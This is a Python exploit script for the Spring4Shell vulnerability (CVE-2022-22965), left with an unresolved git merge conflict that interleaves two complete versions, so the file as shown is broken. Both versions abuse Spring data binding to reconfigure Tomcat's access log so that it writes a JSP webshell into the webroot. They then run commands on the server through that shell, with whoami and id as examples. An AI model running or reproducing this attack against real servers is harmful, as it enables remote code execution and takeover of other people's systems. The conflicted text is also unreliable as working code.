#!/usr/bin/env python3
<<<<<<< HEAD
"""
Title:     Spring4Shell Exploit
Author:    Hyperion Gray Security Team
Homepage:  https://www.hyperiongray.com
Date:      2024-12-15
CVE:       CVE-2022-22965
Advisory:  https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement
Tested on: Spring Framework 5.3.17, Java 11, Tomcat 9

This exploit demonstrates the Spring4Shell vulnerability by writing a webshell
to a vulnerable Spring application running on Tomcat.
=======
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Based on public research and exploits for CVE-2022-22965
# Original vulnerability discovered by:
#  Rapid7 and VMware Security Research Team
#
# Exploit adapted for repository by:
#  Hyperion Gray Security Research Team
#

"""
Spring4Shell (CVE-2022-22965) Remote Code Execution Exploit

This exploit targets a critical remote code execution vulnerability in the Spring
Framework. The vulnerability allows attackers to modify Tomcat logging configuration
through data binding, which can be leveraged to write arbitrary JSP files to the
webroot, achieving remote code execution.

Affected versions:
- Spring Framework 5.3.0 through 5.3.17
- Spring Framework 5.2.0 through 5.2.19
- Older unsupported versions

Requirements:
- Target must be running Spring Framework (spring-webmvc or spring-webflux)
- Target must be deployed as WAR on Apache Tomcat
- Target must be running on Java 9 or higher

The exploit works by abusing Spring's data binding to modify Tomcat's AccessLogValve
configuration, setting custom log patterns, filenames, and directories to create a
JSP webshell in the application's webroot.
>>>>>>> bf9bc6c (Add three modern ExploitDB-based exploits: PHP CGI, Log4Shell, and Spring4Shell)
"""

import argparse
import requests
<<<<<<< HEAD
import logging
import time
from urllib.parse import urljoin, quote

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)


class Spring4ShellExploit:
    """Exploit for CVE-2022-22965 (Spring4Shell)"""
    
    # Simple JSP webshell
    WEBSHELL_CONTENT = """
    <%@ page import="java.util.*,java.io.*"%>
    <%
    if (request.getParameter("cmd") != null) {
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = response.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            os.write(disr.getBytes());
            os.write("\\n".getBytes());
            disr = dis.readLine();
        }
    }
    %>
    """.strip()
    
    def __init__(self, target_url, shell_name='shell.jsp', shell_path=''):
        self.target_url = target_url.rstrip('/')
        self.shell_name = shell_name
        self.shell_path = shell_path
        self.session = requests.Session()
        
    def check_vulnerable(self):
        """Check if the target might be vulnerable"""
        logger.info("Checking if target is vulnerable...")
        
        try:
            # Send a benign request to see if Spring binding works
            test_params = {
                'class.module.classLoader.resources.context.parent.pipeline.first.pattern': 'test',
                'class.module.classLoader.resources.context.parent.pipeline.first.suffix': '.jsp',
                'class.module.classLoader.resources.context.parent.pipeline.first.directory': 'webapps/ROOT',
                'class.module.classLoader.resources.context.parent.pipeline.first.prefix': 'test',
                'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat': '',
            }
            
            response = self.session.post(self.target_url, data=test_params, timeout=10)
            
            # If we get a response without errors, it might be vulnerable
            if response.status_code in [200, 400, 500]:
                logger.info("Target appears to be running Spring Framework")
                return True
            else:
                logger.warning(f"Unexpected response code: {response.status_code}")
                return False
                
        except requests.exceptions.RequestException as e:
            logger.error(f"Error checking target: {e}")
            return False
    
    def exploit(self):
        """Exploit the vulnerability and write a webshell"""
        logger.info(f"Attempting to exploit {self.target_url}")
        
        # Determine the webshell path
        if self.shell_path:
            webshell_location = f"{self.shell_path}/{self.shell_name}"
        else:
            webshell_location = self.shell_name
        
        logger.info(f"Target webshell location: {webshell_location}")
        
        # Payload to write the webshell
        # This exploits Spring's data binding to access Tomcat's valve configuration
        exploit_params = {
            'class.module.classLoader.resources.context.parent.pipeline.first.pattern': 
                self.WEBSHELL_CONTENT,
            'class.module.classLoader.resources.context.parent.pipeline.first.suffix': 
                '.jsp',
            'class.module.classLoader.resources.context.parent.pipeline.first.directory': 
                'webapps/ROOT',
            'class.module.classLoader.resources.context.parent.pipeline.first.prefix': 
                self.shell_name.replace('.jsp', ''),
            'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat': 
                '',
        }
        
        try:
            # Send the exploit
            logger.info("Sending exploit payload...")
            response = self.session.post(
                self.target_url,
                data=exploit_params,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                timeout=10
            )
            
            logger.info(f"Response status: {response.status_code}")
            
            # Wait a moment for the file to be written
            time.sleep(2)
            
            # Try to access the webshell
            shell_url = urljoin(self.target_url, self.shell_name)
            logger.info(f"Checking if webshell was created at: {shell_url}")
            
            test_response = self.session.get(shell_url, timeout=5)
            
            if test_response.status_code == 200:
                logger.info("âœ“ Webshell successfully created!")
                logger.info(f"\nWebshell URL: {shell_url}")
                logger.info(f"Example usage: {shell_url}?cmd=whoami")
                logger.info(f"               curl '{shell_url}?cmd=id'")
                return True
            else:
                logger.warning(f"Webshell check returned status {test_response.status_code}")
                logger.info("The exploit may have failed, or the webshell is at a different location.")
                return False
                
        except requests.exceptions.RequestException as e:
            logger.error(f"Error during exploitation: {e}")
            return False
    
    def execute_command(self, command):
        """Execute a command via the webshell"""
        shell_url = urljoin(self.target_url, self.shell_name)
        
        try:
            logger.info(f"Executing command: {command}")
            response = self.session.get(
                shell_url,
                params={'cmd': command},
                timeout=10
            )
            
            if response.status_code == 200:
                logger.info("Command output:")
                print(response.text)
                return True
            else:
                logger.error(f"Error executing command: status {response.status_code}")
                return False
                
        except requests.exceptions.RequestException as e:
            logger.error(f"Error executing command: {e}")
            return False
=======
import sys
import time
import secrets
import warnings

# Suppress SSL warnings
warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings()


def generate_webshell_payload():
    """
    Generate a simple JSP webshell payload that executes commands.
    
    Returns:
        URL-encoded JSP webshell code
    """
    # Simple JSP webshell that executes commands passed via 'cmd' parameter
    jsp_shell = """<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream in = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String line;
        while ((line = reader.readLine()) != null) {
            out.println(line);
        }
    }
%>"""
    
    # URL encode the payload for use in log pattern
    # The payload will be written to a log file which becomes executable JSP
    encoded_payload = (
        "%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20"
        "%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22))."
        "getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20"
        "b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)"
        "%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"
    )
    
    return encoded_payload


def exploit_spring4shell(target_url, shell_name=None, directory="webapps/ROOT"):
    """
    Exploit CVE-2022-22965 to upload a webshell.
    
    Args:
        target_url: The target Spring application URL
        shell_name: Custom webshell filename (default: random)
        directory: Target directory for webshell (default: webapps/ROOT)
        
    Returns:
        URL of uploaded webshell if successful, None otherwise
    """
    # Generate random shell name if not provided
    if not shell_name:
        shell_name = f"shell_{secrets.token_hex(4)}"
    
    print(f"[*] Targeting: {target_url}")
    print(f"[*] Shell name: {shell_name}.jsp")
    print(f"[*] Target directory: {directory}")
    
    # Prepare the exploit payloads
    # These parameters abuse Spring's data binding to modify Tomcat AccessLogValve
    
    # Step 1: Set the log pattern to our webshell code
    log_pattern = (
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
        + generate_webshell_payload()
    )
    
    # Step 2: Set the log file suffix to .jsp
    log_suffix = (
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
    )
    
    # Step 3: Set the directory where log files (our shell) will be written
    log_directory = (
        f"class.module.classLoader.resources.context.parent.pipeline.first.directory="
        f"{directory}"
    )
    
    # Step 4: Set the log file prefix (our shell name)
    log_prefix = (
        f"class.module.classLoader.resources.context.parent.pipeline.first.prefix="
        f"{shell_name}"
    )
    
    # Step 5: Clear the file date format to make the filename predictable
    log_date_format = (
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    )
    
    # Combine all parameters
    exploit_data = "&".join([
        log_pattern,
        log_suffix,
        log_directory,
        log_prefix,
        log_date_format
    ])
    
    # Additional headers for the webshell injection
    exploit_headers = {
        "prefix": "<%",
        "suffix": "%>//",
        "c": "Runtime"
    }
    
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    
    try:
        session = requests.Session()
        session.verify = False
        
        # Send the exploit - modify Tomcat logging configuration
        print("[*] Sending exploit payload to modify Tomcat logging configuration...")
        response = session.post(
            target_url,
            headers=headers,
            data=exploit_data,
            timeout=15
        )
        
        if response.status_code != 200:
            print(f"[-] Exploit may have failed - HTTP {response.status_code}")
            return None
        
        print("[+] Configuration modified successfully")
        
        # Wait for Tomcat to process the configuration change
        print("[*] Waiting for Tomcat to apply changes...")
        time.sleep(3)
        
        # Trigger the webshell creation by sending a request with our headers
        print("[*] Triggering webshell creation...")
        session.get(
            target_url,
            headers=exploit_headers,
            timeout=15
        )
        
        # Wait for the file to be written
        time.sleep(2)
        
        # Construct the webshell URL
        shell_url = f"{target_url.rstrip('/')}/{shell_name}.jsp"
        
        # Test if the shell is accessible
        print(f"[*] Testing webshell at: {shell_url}")
        test_response = session.get(f"{shell_url}?cmd=whoami", timeout=10)
        
        if test_response.status_code == 200:
            print("[+] Webshell uploaded successfully!")
            print(f"[+] Shell URL: {shell_url}?cmd=YOUR_COMMAND")
            print(f"\n[*] Example: {shell_url}?cmd=whoami")
            return shell_url
        else:
            print(f"[-] Webshell may not be accessible - HTTP {test_response.status_code}")
            print(f"[-] Try manually accessing: {shell_url}?cmd=whoami")
            return shell_url
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during exploitation: {e}")
        return None


def test_webshell(shell_url, command):
    """
    Test an uploaded webshell by executing a command.
    
    Args:
        shell_url: URL of the webshell
        command: Command to execute
    """
    try:
        response = requests.get(
            f"{shell_url}?cmd={command}",
            verify=False,
            timeout=10
        )
        
        if response.status_code == 200:
            print(f"\n[*] Command output:")
            print(response.text)
        else:
            print(f"[-] Command execution failed - HTTP {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Error executing command: {e}")
>>>>>>> bf9bc6c (Add three modern ExploitDB-based exploits: PHP CGI, Log4Shell, and Spring4Shell)


def main():
    parser = argparse.ArgumentParser(
<<<<<<< HEAD
        description='Spring4Shell (CVE-2022-22965) Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic exploitation
  python3 exploit.py --url http://target:8080/app

  # Check if vulnerable without exploiting
  python3 exploit.py --url http://target:8080/app --check-only

  # Custom webshell name and location
  python3 exploit.py --url http://target:8080/app --shell-name custom.jsp

  # Execute command after exploitation
  python3 exploit.py --url http://target:8080/app --command whoami
        """
    )
    
    parser.add_argument('--url', required=True, help='Target application URL')
    parser.add_argument('--shell-name', default='shell.jsp', help='Webshell filename (default: shell.jsp)')
    parser.add_argument('--shell-path', default='', help='Webshell path (default: webapps/ROOT)')
    parser.add_argument('--check-only', action='store_true', help='Only check if target is vulnerable')
    parser.add_argument('--command', help='Command to execute after exploitation')
    
    args = parser.parse_args()
    
    exploit = Spring4ShellExploit(args.url, args.shell_name, args.shell_path)
    
    # Check vulnerability
    if not exploit.check_vulnerable():
        logger.error("Target does not appear to be vulnerable or is not reachable")
        return
    
    if args.check_only:
        logger.info("Check complete. Use without --check-only to attempt exploitation.")
        return
    
    # Attempt exploitation
    if exploit.exploit():
        logger.info("\n[SUCCESS] Exploitation successful!")
        
        # Execute command if provided
        if args.command:
            exploit.execute_command(args.command)
    else:
        logger.error("\n[FAILED] Exploitation failed")
        logger.info("Possible reasons:")
        logger.info("  - Target is not vulnerable")
        logger.info("  - Application is not deployed as WAR")
        logger.info("  - Java version is 8 or lower")
        logger.info("  - Servlet container is not Tomcat")
=======
        description='CVE-2022-22965 (Spring4Shell) Remote Code Execution Exploit',
        epilog='Example: python exploit.py -t http://target.com:8080/app/'
    )
    
    parser.add_argument(
        '-t', '--target',
        required=True,
        help='Target Spring application URL (e.g., http://192.168.1.1:8080/)'
    )
    
    parser.add_argument(
        '-n', '--name',
        help='Custom webshell filename (default: random)'
    )
    
    parser.add_argument(
        '-d', '--directory',
        default='webapps/ROOT',
        help='Target directory for webshell (default: webapps/ROOT)'
    )
    
    parser.add_argument(
        '-c', '--command',
        help='Command to execute after exploitation (for testing)'
    )
    
    args = parser.parse_args()
    
    print("\n" + "="*70)
    print("  CVE-2022-22965 (Spring4Shell) RCE Exploit")
    print("  Spring Framework Remote Code Execution")
    print("="*70 + "\n")
    
    # Execute the exploit
    shell_url = exploit_spring4shell(args.target, args.name, args.directory)
    
    if shell_url and args.command:
        print(f"\n[*] Executing test command: {args.command}")
        test_webshell(shell_url, args.command)
    
    # Exit with appropriate status code
    sys.exit(0 if shell_url else 1)
>>>>>>> bf9bc6c (Add three modern ExploitDB-based exploits: PHP CGI, Log4Shell, and Spring4Shell)


if __name__ == '__main__':
    main()
